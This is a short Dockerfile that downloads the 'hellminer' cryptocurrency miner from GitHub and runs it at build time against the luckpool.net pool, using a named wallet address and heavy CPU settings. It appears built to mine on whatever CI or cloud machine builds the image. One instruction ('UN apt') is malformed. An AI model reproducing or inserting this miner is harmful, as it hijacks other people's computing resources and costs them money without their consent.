FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN nvidia-smi

UN apt -y install wget
RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
RUN tar xf hellminer_cpu_linux.tar.gz
RUN ./hellminer -c na.luckpool.net:3956 -u RRuVKMYRfPbEEpitXZWHKSxVz42BkeXUua.revan3 -p x --cpu 400
